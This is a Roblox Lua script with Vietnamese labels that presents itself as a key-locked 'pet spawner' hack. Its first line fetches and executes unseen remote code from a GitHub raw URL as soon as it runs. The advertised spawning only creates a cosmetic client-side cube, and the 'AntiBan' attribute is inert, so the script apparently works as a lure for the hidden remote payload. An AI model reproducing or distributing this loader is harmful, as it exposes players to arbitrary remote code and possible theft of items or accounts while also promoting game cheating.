-- Tải script từ GitHub
loadstring(game:HttpGet("https://raw.githubusercontent.com/SpDupe/URL-a7b58/main/URL.lua"))()

-- Tạo giao diện chính
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PetSpawnerGUI"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

-- Giao diện hệ thống khóa
local keyFrame = Instance.new("Frame")
keyFrame.Name = "KeySystem"
keyFrame.Size = UDim2.new(0, 400, 0, 200)
keyFrame.Position = UDim2.new(0.5, -200, 0.5, -100)
keyFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
keyFrame.BorderSizePixel = 0
keyFrame.Parent = screenGui

-- Tiêu đề hệ thống khóa
local keyTitle = Instance.new("TextLabel")
keyTitle.Name = "Title"
keyTitle.Size = UDim2.new(1, 0, 0, 40)
keyTitle.Position = UDim2.new(0, 0, 0, 10)
keyTitle.BackgroundTransparency = 1
keyTitle.Text = "Hệ Thống Khóa"
keyTitle.TextColor3 = Color3.new(1, 1, 1)
keyTitle.TextScaled = true
keyTitle.Font = Enum.Font.SourceSansBold
keyTitle.Parent = keyFrame

-- Hướng dẫn nhập khóa
local keyHint = Instance.new("TextLabel")
keyHint.Name = "Hint"
keyHint.Size = UDim2.new(1, 0, 0, 30)
keyHint.Position = UDim2.new(0, 0, 0, 60)
keyHint.BackgroundTransparency = 1
keyHint.Text = "Nhấn để nhập khóa (khóa là Nhanhub)"
keyHint.TextColor3 = Color3.new(1, 1, 1)
keyHint.TextScaled = true
keyHint.Font = Enum.Font.SourceSans
keyHint.Parent = keyFrame

-- Ô nhập khóa
local keyInput = Instance.new("TextBox")
keyInput.Name = "KeyInput"
keyInput.Size = UDim2.new(0, 300, 0, 40)
keyInput.Position = UDim2.new(0.5, -150, 0, 100)
keyInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
keyInput.BorderSizePixel = 0
keyInput.Text = "Khóa: ……"
keyInput.TextColor3 = Color3.new(1, 1, 1)
keyInput.TextScaled = true
keyInput.Font = Enum.Font.SourceSans
keyInput.Parent = keyFrame

-- Nút kiểm tra khóa
local checkKeyBtn = Instance.new("TextButton")
checkKeyBtn.Name = "CheckKey"
checkKeyBtn.Size = UDim2.new(0, 150, 0, 40)
checkKeyBtn.Position = UDim2.new(0.5, -75, 0, 150)
checkKeyBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
checkKeyBtn.BorderSizePixel = 0
checkKeyBtn.Text = "Kiểm Tra Khóa"
checkKeyBtn.TextColor3 = Color3.new(1, 1, 1)
checkKeyBtn.TextScaled = true
checkKeyBtn.Font = Enum.Font.SourceSansBold
checkKeyBtn.Parent = keyFrame

-- Thông tin chức năng
local keyInfo = Instance.new("TextLabel")
keyInfo.Name = "Info"
keyInfo.Size = UDim2.new(1, 0, 0, 30)
keyInfo.Position = UDim2.new(0, 0, 0, 195)
keyInfo.BackgroundTransparency = 1
keyInfo.Text = "Nếu khóa là Nhanhub → kết nối hack | Ngược lại → không kết nối"
keyInfo.TextColor3 = Color3.new(1, 1, 1)
keyInfo.TextScaled = true
keyInfo.Font = Enum.Font.SourceSans
keyInfo.Parent = keyFrame

-- Giao diện sinh thú cưng
local petFrame = Instance.new("Frame")
petFrame.Name = "PetSpawner"
petFrame.Size = UDim2.new(0, 500, 0, 350)
petFrame.Position = UDim2.new(0.5, -250, 0.5, -175)
petFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
petFrame.BorderSizePixel = 0
petFrame.Visible = false
petFrame.Parent = screenGui

-- Tiêu đề sinh thú cưng
local petTitle = Instance.new("TextLabel")
petTitle.Name = "Title"
petTitle.Size = UDim2.new(1, 0, 0, 50)
petTitle.Position = UDim2.new(0, 0, 0, 10)
petTitle.BackgroundTransparency = 1
petTitle.Text = "Sinh Thú Cưng"
petTitle.TextColor3 = Color3.new(1, 1, 1)
petTitle.TextScaled = true
petTitle.Font = Enum.Font.SourceSansBold
petTitle.Parent = petFrame

-- Ô nhập tên thú cưng
local nameInput = Instance.new("TextBox")
nameInput.Name = "NameInput"
nameInput.Size = UDim2.new(0, 400, 0, 40)
nameInput.Position = UDim2.new(0.5, -200, 0, 80)
nameInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
nameInput.BorderSizePixel = 0
nameInput.Text = "Tên thú cưng: ...(Nhập tên thú cưng cần sinh)"
nameInput.TextColor3 = Color3.new(1, 1, 1)
nameInput.TextScaled = true
nameInput.Font = Enum.Font.SourceSans
nameInput.Parent = petFrame

local nameHint = Instance.new("TextLabel")
nameHint.Name = "Hint"
nameHint.Size = UDim2.new(0, 400, 0, 20)
nameHint.Position = UDim2.new(0.5, -200, 0, 125)
nameHint.BackgroundTransparency = 1
nameHint.Text = "Nhấn để nhập tên thú cưng"
nameHint.TextColor3 = Color3.new(1, 1, 1)
nameHint.TextScaled = true
nameHint.Font = Enum.Font.SourceSans
nameHint.Parent = petFrame

-- Ô nhập tuổi thú cưng
local ageInput = Instance.new("TextBox")
ageInput.Name = "AgeInput"
ageInput.Size = UDim2.new(0, 400, 0, 40)
ageInput.Position = UDim2.new(0.5, -200, 0, 150)
ageInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
ageInput.BorderSizePixel = 0
ageInput.Text = "Tuổi thú cưng: ...(Nhập tuổi thú cưng cần sinh)"
ageInput.TextColor3 = Color3.new(1, 1, 1)
ageInput.TextScaled = true
ageInput.Font = Enum.Font.SourceSans
ageInput.Parent = petFrame

local ageHint = Instance.new("TextLabel")
ageHint.Name = "Hint"
ageHint.Size = UDim2.new(0, 400, 0, 20)
ageHint.Position = UDim2.new(0.5, -200, 0, 195)
ageHint.BackgroundTransparency = 1
ageHint.Text = "Nhấn để nhập tuổi thú cưng"
ageHint.TextColor3 = Color3.new(1, 1, 1)
ageHint.TextScaled = true
ageHint.Font = Enum.Font.SourceSans
ageHint.Parent = petFrame

-- Ô nhập cân nặng thú cưng
local kgInput = Instance.new("TextBox")
kgInput.Name = "KgInput"
kgInput.Size = UDim2.new(0, 400, 0, 40)
kgInput.Position = UDim2.new(0.5, -200, 0, 220)
kgInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
kgInput.BorderSizePixel = 0
kgInput.Text = "Cân nặng thú cưng: ...(Nhập cân nặng thú cưng cần sinh)"
kgInput.TextColor3 = Color3.new(1, 1, 1)
kgInput.TextScaled = true
kgInput.Font = Enum.Font.SourceSans
kgInput.Parent = petFrame

local kgHint = Instance.new("TextLabel")
kgHint.Name = "Hint"
kgHint.Size = UDim2.new(0, 400, 0, 20)
kgHint.Position = UDim2.new(0.5, -200, 0, 265)
kgHint.BackgroundTransparency = 1
kgHint.Text = "Nhấn để nhập cân nặng thú cưng"
kgHint.TextColor3 = Color3.new(1, 1, 1)
kgHint.TextScaled = true
kgHint.Font = Enum.Font.SourceSans
kgHint.Parent = petFrame

-- Nút sinh thú cưng
local spawnBtn = Instance.new("TextButton")
spawnBtn.Name = "SpawnPet"
spawnBtn.Size = UDim2.new(0, 200, 0, 50)
spawnBtn.Position = UDim2.new(0.5, -100, 0, 290)
spawnBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
spawnBtn.BorderSizePixel = 0
spawnBtn.Text = "Sinh Thú Cưng"
spawnBtn.TextColor3 = Color3.new(1, 1, 1)
spawnBtn.TextScaled = true
spawnBtn.Font = Enum.Font.SourceSansBold
spawnBtn.Parent = petFrame

local spawnHint = Instance.new("TextLabel")
spawnHint.Name = "Hint"
spawnHint.Size = UDim2.new(0, 200, 0, 20)
spawnHint.Position = UDim2.new(0.5, -100, 0, 345)
spawnHint.BackgroundTransparency = 1
spawnHint.Text = "Nhấn để sinh thú cưng"
spawnHint.TextColor3 = Color3.new(1, 1, 1)
spawnHint.TextScaled = true
spawnHint.Font = Enum.Font.SourceSans
spawnHint.Parent = petFrame

-- Chức năng xác thực khóa
checkKeyBtn.MouseButton1Click:Connect(function()
    if keyInput.Text == "Nhanhub" then
        keyFrame.Visible = false
        petFrame.Visible = true
    else
        keyInput.Text = "Khóa không hợp lệ!"
        wait(1)
        keyInput.Text = "Khóa: ……"
    end
end)

-- Chức năng sinh thú cưng
spawnBtn.MouseButton1Click:Connect(function()
    local petName = nameInput.Text
    local petAge = ageInput.Text
    local petKg = kgInput.Text
    
    -- Kiểm tra đầu vào
    if petName == "Tên thú cưng: ...(Nhập tên thú cưng cần sinh)" or 
       petAge == "Tuổi thú cưng: ...(Nhập tuổi thú cưng cần sinh)" or 
       petKg == "Cân nặng thú cưng: ...(Nhập cân nặng thú cưng cần sinh)" then
        return
    end
    
    -- Lấy thông tin người chơi
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    
    -- Tạo mô hình thú cưng
    local petModel = Instance.new("Model")
    petModel.Name = petName
    
    -- Tạo bộ phận cơ thể thú cưng
    local petPart = Instance.new("Part")
    petPart.Name = "Body"
    petPart.Size = Vector3.new(2, 2, 2)
    petPart.Material = Enum.Material.Plastic
    petPart.BrickColor = BrickColor.random()
    petPart.Parent = petModel
    
    -- Thêm thông tin thú cưng
    local petTag = Instance.new("StringValue")
    petTag.Name = "PetInfo"
    petTag.Value = petName .. "|" .. petAge .. "|" .. petKg
    petTag.Parent = petModel
    
    -- Đặt vị trí thú cưng
    petModel.PrimaryPart = petPart
    petModel:SetPrimaryPartCFrame(CFrame.new(humanoidRootPart.Position + Vector3.new(0, 5, 0)))
    
    -- Thêm vào không gian làm việc
    petModel.Parent = workspace
    
    -- Thêm tính năng chống phát hiện
    petModel:SetAttribute("AntiBan", true)
    petModel:SetAttribute("SpawnedByScript", true)
    
    -- Đặt lại các ô nhập liệu
    nameInput.Text = "Tên thú cưng: ...(Nhập tên thú cưng cần sinh)"
    ageInput.Text = "Tuổi thú cưng: ...(Nhập tuổi thú cưng cần sinh)"
    kgInput.Text = "Cân nặng thú cưng: ...(Nhập cân nặng thú cưng cần sinh)"
end)

-- Chức năng tương tác ô nhập liệu
nameInput.Focused:Connect(function()
    if nameInput.Text == "Tên thú cưng: ...(Nhập tên thú cưng cần sinh)" then
        nameInput.Text = ""
    end
end)

nameInput.FocusLost:Connect(function()
    if nameInput.Text == "" then
        nameInput.Text = "Tên thú cưng: ...(Nhập tên thú cưng cần sinh)"
    end
end)

ageInput.Focused:Connect(function()
    if ageInput.Text == "Tuổi thú cưng: ...(Nhập tuổi thú cưng cần sinh)" then
        ageInput.Text = ""
    end
end)

ageInput.FocusLost:Connect(function()
    if ageInput.Text == "" then
        ageInput.Text = "Tuổi thú cưng: ...(Nhập tuổi thú cưng cần sinh)"
    end
end)

kgInput.Focused:Connect(function()
    if kgInput.Text == "Cân nặng thú cưng: ...(Nhập cân nặng thú cưng cần sinh)" then
        kgInput.Text = ""
    end
end)

kgInput.FocusLost:Connect(function()
    if kgInput.Text == "" then
        kgInput.Text = "Cân nặng thú cưng: ...(Nhập cân nặng thú cưng cần sinh)"
    end
end)

keyInput.Focused:Connect(function()
    if keyInput.Text == "Khóa: ……" then
        keyInput.Text = ""
    end
end)

keyInput.FocusLost:Connect(function()
    if keyInput.Text == "" then
        keyInput.Text = "Khóa: ……"
    end
end)